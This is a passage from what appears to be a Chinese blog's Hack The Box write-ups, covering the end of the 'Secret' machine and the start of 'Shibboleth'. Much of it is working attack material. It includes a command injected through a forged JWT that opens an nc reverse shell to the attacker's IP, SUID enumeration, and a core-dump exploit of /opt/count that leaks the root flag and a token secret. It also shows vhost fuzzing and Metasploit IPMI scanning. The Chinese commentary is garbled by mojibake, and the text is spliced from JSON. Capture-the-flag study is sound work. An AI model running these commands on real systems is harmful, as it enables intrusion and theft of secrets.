eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.FM3CbCKxrJ79hXwF02Rg3jsi5bpNeg1txPyb2nWbAA0&#39; {&quot;killed&quot;:false,&quot;code&quot;:1,&quot;signal&quot;:null,&quot;cmd&quot;:&quot;git log --oneline ;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.12 4444 &gt;/tmp/f\\n\\n&quot;} â”Œâ”€â”€(rootğŸ’€kali)-[~] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.12] from (UNKNOWN) [10.10.11.120] 40314 /bin/sh: 0: can&#39;t access tty; job control turned off $ python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;; dasith@secret:~/local-web$ whoami&amp;&amp;id whoami&amp;&amp;id dasith uid=1000(dasith) gid=1000(dasith) groups=1000(dasith) æˆåŠŸè·å–åˆ°ä¸€ä¸ªshell dasith@secret:~/local-web$ cd cd dasith@secret:~$ ls ls local-web user.txt dasith@secret:~$ cat user.txt cat user.txt 2b3b6e0a590097b69da4de9631b570fd æˆåŠŸè·å–åˆ°useræƒé™çš„flagæ–‡ä»¶ æƒé™æå‡æŸ¥çœ‹ä¸€ä¸‹å½“å‰çš„å¯æ‰§è¡Œæ–‡ä»¶ find / -type f -perm -u=s 2&gt;/dev/null dasith@secret:~$ find / -type f -perm -u=s 2&gt;/dev/null find / -type f -perm -u=s 2&gt;/dev/null /usr/bin/pkexec /usr/bin/sudo /usr/bin/fusermount /usr/bin/umount /usr/bin/mount /usr/bin/gpasswd /usr/bin/su /usr/bin/passwd /usr/bin/chfn /usr/bin/newgrp /usr/bin/chsh /usr/lib/snapd/snap-confine /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/openssh/ssh-keysign /usr/lib/eject/dmcrypt-get-device /usr/lib/policykit-1/polkit-agent-helper-1 /opt/count /snap/snapd/13640/usr/lib/snapd/snap-confine /snap/snapd/13170/usr/lib/snapd/snap-confine /snap/core20/1169/usr/bin/chfn /snap/core20/1169/usr/bin/chsh /snap/core20/1169/usr/bin/gpasswd /snap/core20/1169/usr/bin/mount /snap/core20/1169/usr/bin/newgrp /snap/core20/1169/usr/bin/passwd /snap/core20/1169/usr/bin/su /snap/core20/1169/usr/bin/sudo /snap/core20/1169/usr/bin/umount /snap/core20/1169/usr/lib/dbus-1.0/dbus-daemon-launch-helper /snap/core20/1169/usr/lib/openssh/ssh-keysign /snap/core18/2128/bin/mount /snap/core18/2128/bin/ping /snap/core18/2128/bin/su /snap/core18/2128/bin/umount /snap/core18/2128/usr/bin/chfn /snap/core18/2128/usr/bin/chsh /snap/core18/2128/usr/bin/gpasswd /snap/core18/2128/usr/bin/newgrp /snap/core18/2128/usr/bin/passwd /snap/core18/2128/usr/bin/sudo /snap/core18/2128/usr/lib/dbus-1.0/dbus-daemon-launch-helper /snap/core18/2128/usr/lib/openssh/ssh-keysign /snap/core18/1944/bin/mount /snap/core18/1944/bin/ping /snap/core18/1944/bin/su /snap/core18/1944/bin/umount /snap/core18/1944/usr/bin/chfn /snap/core18/1944/usr/bin/chsh /snap/core18/1944/usr/bin/gpasswd /snap/core18/1944/usr/bin/newgrp /snap/core18/1944/usr/bin/passwd /snap/core18/1944/usr/bin/sudo /snap/core18/1944/usr/lib/dbus-1.0/dbus-daemon-launch-helper /snap/core18/1944/usr/lib/openssh/ssh-keysign è·å–åˆ°äº†ä¸€äº›å¯æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶ æˆ‘ä»¬æŠŠç›®å…‰ç€çœ¼æ”¾åœ¨/opt/countä¸Š dasith@secret:/opt$ cat code.c cat code.c #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;dirent.h&gt; #include &lt;sys/prctl.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/stat.h&gt; #include &lt;linux/limits.h&gt; void dircount(const char *path, char *summary) { DIR *dir; char fullpath[PATH_MAX]; struct dirent *ent; struct stat fstat; int tot = 0, regular_files = 0, directories = 0, symlinks = 0; if((dir = opendir(path)) == NULL) { printf(&quot;\\nUnable to open directory.\\n&quot;); exit(EXIT_FAILURE); } while ((ent = readdir(dir)) != NULL) { ++tot; strncpy(fullpath, path, PATH_MAX-NAME_MAX-1); strcat(fullpath, &quot;/&quot;); strncat(fullpath, ent-&gt;d_name, strlen(ent-&gt;d_name)); if (!lstat(fullpath, &amp;fstat)) { if(S_ISDIR(fstat.st_mode)) { printf(&quot;d&quot;); ++directories; } else if(S_ISLNK(fstat.st_mode)) { printf(&quot;l&quot;); ++symlinks; } else if(S_ISREG(fstat.st_mode)) { printf(&quot;-&quot;); ++regular_files; } else printf(&quot;?&quot;); printf((fstat.st_mode &amp; S_IRUSR) ? &quot;r&quot; : &quot;-&quot;); printf((fstat.st_mode &amp; S_IWUSR) ? &quot;w&quot; : &quot;-&quot;); printf((fstat.st_mode &amp; S_IXUSR) ? &quot;x&quot; : &quot;-&quot;); printf((fstat.st_mode &amp; S_IRGRP) ? &quot;r&quot; : &quot;-&quot;); printf((fstat.st_mode &amp; S_IWGRP) ? &quot;w&quot; : &quot;-&quot;); printf((fstat.st_mode &amp; S_IXGRP) ? &quot;x&quot; : &quot;-&quot;); printf((fstat.st_mode &amp; S_IROTH) ? &quot;r&quot; : &quot;-&quot;); printf((fstat.st_mode &amp; S_IWOTH) ? &quot;w&quot; : &quot;-&quot;); printf((fstat.st_mode &amp; S_IXOTH) ? &quot;x&quot; : &quot;-&quot;); } else { printf(&quot;??????????&quot;); } printf (&quot;\\t%s\\n&quot;, ent-&gt;d_name); } closedir(dir); snprintf(summary, 4096, &quot;Total entries = %d\\nRegular files = %d\\nDirectories = %d\\nSymbolic links = %d\\n&quot;, tot, regular_files, directories, symlinks); printf(&quot;\\n%s&quot;, summary); } void filecount(const char *path, char *summary) { FILE *file; char ch; int characters, words, lines; file = fopen(path, &quot;r&quot;); if (file == NULL) { printf(&quot;\\nUnable to open file.\\n&quot;); printf(&quot;Please check if file exists and you have read privilege.\\n&quot;); exit(EXIT_FAILURE); } characters = words = lines = 0; while ((ch = fgetc(file)) != EOF) { characters++; if (ch == &#39;\\n&#39; || ch == &#39;\\0&#39;) lines++; if (ch == &#39; &#39; || ch == &#39;\\t&#39; || ch == &#39;\\n&#39; || ch == &#39;\\0&#39;) words++; } if (characters &gt; 0) { words++; lines++; } snprintf(summary, 256, &quot;Total characters = %d\\nTotal words = %d\\nTotal lines = %d\\n&quot;, characters, words, lines); printf(&quot;\\n%s&quot;, summary); } int main() { char path[100]; int res; struct stat path_s; char summary[4096]; printf(&quot;Enter source file/directory name: &quot;); scanf(&quot;%99s&quot;, path); getchar(); stat(path, &amp;path_s); if(S_ISDIR(path_s.st_mode)) dircount(path, summary); else filecount(path, summary); // drop privs to limit file write setuid(getuid()); // Enable coredump generation prctl(PR_SET_DUMPABLE, 1); printf(&quot;Save results a file? [y/N]: &quot;); res = getchar(); if (res == 121 || res == 89) { printf(&quot;Path: &quot;); scanf(&quot;%99s&quot;, path); FILE *fp = fopen(path, &quot;a&quot;); if (fp != NULL) { fputs(summary, fp); fclose(fp); } else { printf(&quot;Could not open %s for writing\\n&quot;, path); } } return 0; } è¿™æ˜¯countçš„æºç ï¼Œé€šè¿‡åˆ†æåå¾—çŸ¥ è¿™é‡Œå¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå¦‚æœæˆ‘ä»¬åœ¨æ‰§è¡Œä»£ç ä¸­å´©æºƒäº†ï¼ŒæŠ¥å‘Šé€šå¸¸ä¼šä¿å­˜åœ¨/var/crashä¸­ åœ¨é€šå¸¸æƒ…å†µä¸‹ï¼Œè¿™æ˜¯ä¸å¯èƒ½çš„ï¼Œä½†æ˜¯é€šè¿‡è¿™ä¸ªpemè®¾ç½®prctl(PR_SET_DUMPABLE, 1);ï¼Œå®ƒå¯ä»¥è¢«å®ç° ç”±äºå®ƒè®¾ç½®ä¸º1ï¼Œæˆ‘ä»¬å¯ä»¥äº§ç”Ÿæ ¸å¿ƒè½¬å‚¨ï¼Œåˆ©ç”¨çš„è¯éœ€è¦ä¸¤ä¸ªæ¡ä»¶ é¦–å…ˆéœ€è¦ç¡®ä¿æœ‰ä¸¤ä¸ªshell å¯ä»¥å¯¼è‡´å´©æºƒ ç°åœ¨è®©æˆ‘ä»¬å»ç”¨ä¸Šé¢æ¼æ´åˆ©ç”¨çš„æ–¹å¼å†è·å–ä¸€ä¸ªshell Shell 1dasith@secret:/$ cd /opt cd /opt dasith@secret:/opt$ ./count -p ./count -p Enter source file/directory name: /root/root.txt /root/root.txt Total characters = 33 Total words = 2 Total lines = 2 Save results a file? [y/N]: y y æ‰§è¡Œåå»shell 2è®©è¿›ç¨‹å´©æºƒ Shell 2dasith@secret:~/local-web$ cd /opt cd /opt dasith@secret:/opt$ ps -aux | grep count ps -aux | grep count root 862 0.0 0.1 235672 7480 ? Ssl 06:15 0:00 /usr/lib/accountsservice/accounts-daemon root 1342 0.0 0.0 2488 516 ? S 06:50 0:00 ./count root 1435 0.0 0.0 2488 588 ? S 06:54 0:00 ./count dasith 1460 0.0 1.0 52448 41712 ? S 07:00 0:00 gdb ./count dasith 1462 0.0 0.0 2488 600 ? S 07:00 0:00 /opt/count root 1850 0.0 0.0 2488 592 pts/0 S+ 07:41 0:00 ./count -p dasith 1885 0.0 0.0 2488 524 pts/4 S+ 07:43 0:00 ./count -p dasith 1887 0.0 0.0 6432 740 pts/2 S+ 07:44 0:00 grep --color=auto count dasith@secret:/opt$ kill -BUS 1885 kill -BUS 1885 ç„¶åå†å»shell1æ£€æŸ¥è¿›ç¨‹æ˜¯å¦å´©æºƒ Shell 1 ç¬¬äºŒæ¬¡Path: Bus error (core dumped) å·²ç»çœ‹åˆ°è¿™å¥æç¤ºäº†ï¼Œä½†ä½œä¸ºä¿é™©æˆ‘ä»¬è¿˜æ˜¯å†éªŒè¯ä¸€æ¬¡ dasith@secret:/opt$ cd /var/crash cd /var/crash dasith@secret:/var/crash$ ls -la ls -la total 36 drwxrwxrwt 2 root root 4096 Dec 6 07:44 . drwxr-xr-x 14 root root 4096 Aug 13 05:12 .. -rw-r----- 1 dasith dasith 28207 Dec 6 07:44 _opt_count.1000.crash è¿™é‡Œå¯ä»¥çœ‹åˆ°å·²ç»ç”Ÿæˆäº†é”™è¯¯æ—¥å¿—äº†ï¼Œæ–°å»ºä¸€ä¸ªæˆ‘ä»¬è‡ªå·±çš„ç›®å½•ï¼Œç„¶åæŠŠæ–‡ä»¶æ‹·è´è¿‡å» dasith@secret:/var/crash$ mkdir /tmp/lucifiel mkdir /tmp/lucifiel dasith@secret:/var/crash$ apport-unpack _opt_count.1000.crash /tmp/lucifiel apport-unpack _opt_count.1000.crash /tmp/lucifiel dasith@secret:/var/crash$ cd /tmp/lucifiel cd /tmp/lucifiel dasith@secret:/tmp/lucifiel$ ls -la ls -la total 436 drwxr-xr-x 2 dasith dasith 4096 Dec 6 07:51 . drwxrwxrwt 13 root root 4096 Dec 6 07:49 .. -rw-r--r-- 1 dasith dasith 5 Dec 6 07:51 Architecture -rw-r--r-- 1 dasith dasith 380928 Dec 6 07:51 CoreDump -rw-r--r-- 1 dasith dasith 24 Dec 6 07:51 Date -rw-r--r-- 1 dasith dasith 12 Dec 6 07:51 DistroRelease -rw-r--r-- 1 dasith dasith 10 Dec 6 07:51 ExecutablePath -rw-r--r-- 1 dasith dasith 10 Dec 6 07:51 ExecutableTimestamp -rw-r--r-- 1 dasith dasith 5 Dec 6 07:51 ProblemType -rw-r--r-- 1 dasith dasith 10 Dec 6 07:51 ProcCmdline -rw-r--r-- 1 dasith dasith 4 Dec 6 07:51 ProcCwd -rw-r--r-- 1 dasith dasith 53 Dec 6 07:51 ProcEnviron -rw-r--r-- 1 dasith dasith 2144 Dec 6 07:51 ProcMaps -rw-r--r-- 1 dasith dasith 1336 Dec 6 07:51 ProcStatus -rw-r--r-- 1 dasith dasith 1 Dec 6 07:51 Signal -rw-r--r-- 1 dasith dasith 29 Dec 6 07:51 Uname -rw-r--r-- 1 dasith dasith 3 Dec 6 07:51 UserGroups æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªCoreDumpæ–‡ä»¶ï¼Œæˆ‘ä»¬å°†å…¶ä»¥å­—ç¬¦ä¸²å½¢å¼è¾“å‡º dasith@secret:/tmp/lucifiel$ strings CoreDump strings CoreDump CORE CORE count ./count -p IGISCORE CORE ELIFCORE /opt/count /opt/count /opt/count /opt/count /opt/count /usr/lib/x86_64-linux-gnu/libc-2.31.so /usr/lib/x86_64-linux-gnu/libc-2.31.so /usr/lib/x86_64-linux-gnu/libc-2.31.so /usr/lib/x86_64-linux-gnu/libc-2.31.so /usr/lib/x86_64-linux-gnu/libc-2.31.so /usr/lib/x86_64-linux-gnu/libc-2.31.so /usr/lib/x86_64-linux-gnu/ld-2.31.so /usr/lib/x86_64-linux-gnu/ld-2.31.so /usr/lib/x86_64-linux-gnu/ld-2.31.so /usr/lib/x86_64-linux-gnu/ld-2.31.so /usr/lib/x86_64-linux-gnu/ld-2.31.so CORE //////////////// Path: Could LINUX //////////////// Path: Could TUUU /lib64/ld-linux-x86-64.so.2 libc.so.6 setuid exit readdir fopen closedir __isoc99_scanf strncpy __stack_chk_fail putchar fgetc strlen prctl getchar fputs fclose opendir getuid strncat __cxa_finalize __libc_start_main snprintf __xstat __lxstat GLIBC_2.7 GLIBC_2.4 GLIBC_2.2.5 _ITM_deregisterTMCloneTable __gmon_start__ _ITM_registerTMCloneTable Unable to open directory. ?????????? Total entries = %d Regular files = %d Directories = %d Symbolic links = %d Unable to open file. Please check if file exists and you have read privilege. Total characters = %d Total words = %d Total lines = %d Enter source file/directory name: %99s Save results a file? [y/N]: Path: Could not open %s for writing :*3$&quot; Path: esults a file? [y/N]: words = 2 Total lines = 2 oot/root.txt 1bf72c039cbd58751b38c6916602f537 aliases ethers group gshadow hosts initgroups netgroup networks passwd protocols publickey services shadow CAk[S libc.so.6 /lib/x86_64-linux-gnu libc.so.6 uTi7J |F:m _rtld_global __get_cpu_features _dl_find_dso_for_object _dl_make_stack_executable _dl_exception_create __libc_stack_end _dl_catch_exception malloc _dl_deallocate_tls _dl_signal_exception __tunable_get_val __libc_enable_secure __tls_get_addr _dl_get_tls_static_info calloc _dl_exception_free _dl_debug_state _dl_argv _dl_allocate_tls_init _rtld_global_ro realloc _dl_rtld_di_serinfo _dl_mcount _dl_allocate_tls _dl_signal_error _dl_exception_create_format _r_debug _dl_catch_error ld-linux-x86-64.so.2 GLIBC_2.2.5 GLIBC_2.3 GLIBC_2.4 GLIBC_PRIVATE sse2 x86_64 avx512_1 i586 i686 haswell xeon_phi linux-vdso.so.1 tls/haswell/avx512_1/x86_64/tls/haswell/x86_64/tls/avx512_1/x86_64/tls/x86_64/ /lib/x86_64-linux-gnu/libc.so.6 %%%%%%%%%%%%%%%% //////////////// ory name: %99s /root/root.txt Total characters = 33 Total words = 2 Total lines = 2 cI,b x86_64 ./count SHELL=/bin/sh versioning=[object Object] unstable_restarts=0 treekill=true env=[object Object] filter_env= namespace=default restart_time=0 DB_CONNECT=mongodb://127.0.0.1:27017/auth-web axm_options=[object Object] vizion_running=false PWD=/opt LOGNAME=dasith PM2_USAGE=CLI exec_interpreter=node PM2_HOME=/home/dasith/.pm2 HOME=/home/dasith NODE_APP_INSTANCE=0 LANG=en_US.UTF-8 LS_COLORS= pm_id=0 version=1.0.0 pm_uptime=1638771355228 km_link=false pm_cwd=/home/dasith/local-web axm_monitor=[object Object] instance_var=NODE_APP_INSTANCE pmx=true unique_id=340d74ce-a3fa-4484-a533-bfcb827fe92c LESSCLOSE=/usr/bin/lesspipe %s %s vizion=true username=dasith LESSOPEN=| /usr/bin/lesspipe %s watch=false windowsHide=true automation=true axm_actions= SHLVL=1 TOKEN_SECRET=gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE PM2_INTERACTOR_PROCESSING=true created_at=1633619800035 merge_logs=true pm_pid_path=/home/dasith/.pm2/pids/index-0.pid PATH=/usr/bin:/bin pm_err_log_path=/home/dasith/.pm2/logs/index-error.log node_version=10.19.0 kill_retry_time=100 autorestart=true axm_dynamic=[object Object] node_args= exec_mode=fork_mode pm_exec_path=/home/dasith/local-web/index.js OLDPWD=/ status=launching name=index pm_out_log_path=/home/dasith/.pm2/logs/index-out.log _=./count ./count bemX __vdso_gettimeofday __vdso_time __vdso_clock_gettime __vdso_clock_getres __vdso_getcpu linux-vdso.so.1 LINUX_2.6 Linux Linux AUATS A\\A]] [A\\M A]]I [A\\] [A\\] GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0 .shstrtab .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_d .dynamic .note .eh_frame_hdr .eh_frame .text .altinstructions .altinstr_replacement .comment oot/root.txt 1bf72c039cbd58751b38c6916602f537 ä»ä¸­è·å–åˆ°äº†rootæƒé™çš„flagæ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Shibboleth - Hackthebox","slug":"Hackthebox - Shibboleth","date":"2021-12-03T11:38:36.000Z","updated":"2023-05-20T03:09:06.000Z","comments":true,"path":"2021/12/03/Hackthebox - Shibboleth/","link":"","permalink":"http://www.lucifiel.com/2021/12/03/Hackthebox%20-%20Shibboleth/","excerpt":"","text":"Hackthebox - Shibbolethé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†é¦–å…ˆä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.124 Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-02 20:39 EST Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn Nmap done: 1 IP address (0 hosts up) scanned in 2.92 seconds ä¸€å°ç¦pingçš„ä¸»æœºï¼ŒåŠ ä¸Š-Pnå‚æ•°å§ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -sS -A -sC -sV -Pn --min-rate 5000 10.10.11.124 Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-02 21:32 EST Nmap scan report for bogon (10.10.11.124) Host is up (0.27s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to http://shibboleth.htb/ No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=12/2%OT=80%CT=1%CU=31778%PV=Y%DS=2%DC=T%G=Y%TM=61A981D OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=FB%GCD=2%ISR=10D%TI=Z%CI=Z%II=I%TS=A)SEQ( OS:SP=FC%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3= OS:M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=FE OS:88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7 OS:%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=40%W=0%S=Z OS:%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=40%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y OS:%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR OS:%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40 OS:%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G OS:%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: Host: shibboleth.htb TRACEROUTE (using port 3389/tcp) HOP RTT ADDRESS 1 272.47 ms bogon (10.10.14.1) 2 273.08 ms bogon (10.10.11.124) OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 33.70 seconds å‘ç°åªæœ‰ä¸€ä¸ª80ç«¯å£ï¼Œå»è®¿é—®ä¸€ä¸‹ ç›´æ¥è®¿é—®ä¼šè¢«è·³è½¬åˆ°shibboleth.htbï¼Œå’±ä»¬ç»™ä»–åŠ ä¸€ä¸ªhosts echo 10.10.11.124 shibboleth.htb &gt;&gt; /etc/hosts å†æ¬¡è®¿é—®å°±æ²¡é—®é¢˜äº†ï¼Œè€è§„çŸ©ï¼Œæ‰«æä¸€ä¸‹URLï¼Œç„¶åé¡ºä¾¿çœ‹çœ‹ç½‘é¡µ â”Œâ”€â”€(rootğŸ’€kali)-[~] â””â”€# ffuf -u &quot;http://shibboleth.htb/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fc 403 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://shibboleth.htb/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response status: 403 ________________________________________________ assets [Status: 301, Size: 317, Words: 20, Lines: 10] forms [Status: 301, Size: 316, Words: 20, Lines: 10] . [Status: 200, Size: 59474, Words: 17014, Lines: 1324] :: Progress: [43003/43003] :: Job [1/1] :: 123 req/sec :: Duration: [0:05:55] :: Errors: 0 :: å¥½åƒä¹Ÿæ²¡ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ï¼Œæ˜¯ä¸æ˜¯æ€è·¯é”™äº†ï¼Ÿæ‰¾ä¸€ä¸‹vhostè¯•è¯• â”Œâ”€â”€(rootğŸ’€kali)-[~] â””â”€# ffuf -u &quot;http://shibboleth.htb/&quot; -H &quot;Host:FUZZ.shibboleth.htb&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://shibboleth.htb/ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt :: Header : Host: FUZZ.shibboleth.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200 ________________________________________________ monitor [Status: 200, Size: 3686, Words: 192, Lines: 30] monitoring [Status: 200, Size: 3686, Words: 192, Lines: 30] zabbix [Status: 200, Size: 3686, Words: 192, Lines: 30] :: Progress: [4989/4989] :: Job [1/1] :: 95 req/sec :: Duration: [0:00:49] :: Errors: 0 :: å‘ç°ä¸‰ä¸ªvshostï¼Œéƒ½åŠ å…¥åˆ°hostså†…å§ echo 10.10.11.124 monitor.shibboleth.htb monitoring.shibboleth.htb zabbix.shibboleth.htb &gt;&gt; /etc/hosts ä¸‰ä¸ªvhoståˆ°çš„é¡µé¢éƒ½æ˜¯ä¸€æ ·çš„ æµ‹è¯•äº†ä¸€ä¸‹é»˜è®¤å£ä»¤å’Œå¼±å£ä»¤ï¼Œå‡æ— æ³•æ­£å¸¸è¿›å…¥ æ‰«æä¸€ä¸‹ZABBIXçš„UDPç«¯å£ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -sS -A -sC -sV -Pn -sU --min-rate 5000 10.10.11.124 Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-02 21:34 EST Nmap scan report for bogon (10.10.11.124) Host is up (0.25s latency). Not shown: 1002 closed ports, 996 open|filtered ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to http://shibboleth.htb/ 623/udp open asf-rmcp 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port623-UDP:V=7.91%I=7%D=12/2%Time=61A98220%P=x86_64-pc-linux-gnu%r(ipm SF:i-rmcp,1E,&quot;\\x06\\0\\xff\\x07\\0\\0\\0\\0\\0\\0\\0\\0\\0\\x10\\x81\\x1cc\\x20\\x008\\0\\x01 SF:\\x97\\x04\\x03\\0\\0\\0\\0\\t&quot;); No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=12/2%OT=80%CT=1%CU=19625%PV=Y%DS=2%DC=T%G=Y%TM=61A99CF OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=FB%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS( OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11 OS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN( OS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=Y%DF=Y%T=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=40%W OS:=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A= OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40 OS:%CD=S) Network Distance: 2 hops Service Info: Host: shibboleth.htb TRACEROUTE (using port 110/tcp) HOP RTT ADDRESS 1 262.39 ms bogon (10.10.14.1) 2 247.76 ms bogon (10.10.11.124) OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 6882.83 seconds æ¼æ´åˆ©ç”¨å»Googleä¸€ä¸‹623ç«¯å£çš„æœåŠ¡çœ‹çœ‹æ˜¯å¦æœ‰å¯åˆ©ç”¨çš„æ¼æ´ Google asf-rmcp exploit è¿˜çœŸæ‰¾åˆ°ä¸€ç¯‡ç›¸å…³æ–‡ç«  https://book.hacktricks.xyz/pentesting/623-udp-ipmi è¿™é‡Œä»‹ç»äº†msfä¸­ipmiçš„ç‰ˆæœ¬è¯†åˆ«çš„è„šæœ¬ï¼Œå»å°è¯•ä¸€ä¸‹ msf6 &gt; use auxiliary/scanner/ipmi/ipmi_version msf6 auxiliary(scanner/ipmi/ipmi_version) &gt; show options Module options (auxiliary/scanner/ipmi/ipmi_version): Name Current Setting Required Description ---- --------------- -------- ----------- BATCHSIZE 256 yes The number of hosts to probe in each set RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 623 yes The target port (UDP) THREADS 10 yes The number of concurrent threads msf6 auxiliary(scanner/ipmi/ipmi_version) &gt; set rhosts 10.10.11.124 rhosts =&gt; 10.10.11.124 msf6 auxiliary(scanner/ipmi/ipmi_version) &gt; exploit [*] Sending IPMI requests to 10.10.11.124-&gt;10.10.11.124 (1 hosts) [+] 10.10.11.124:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed 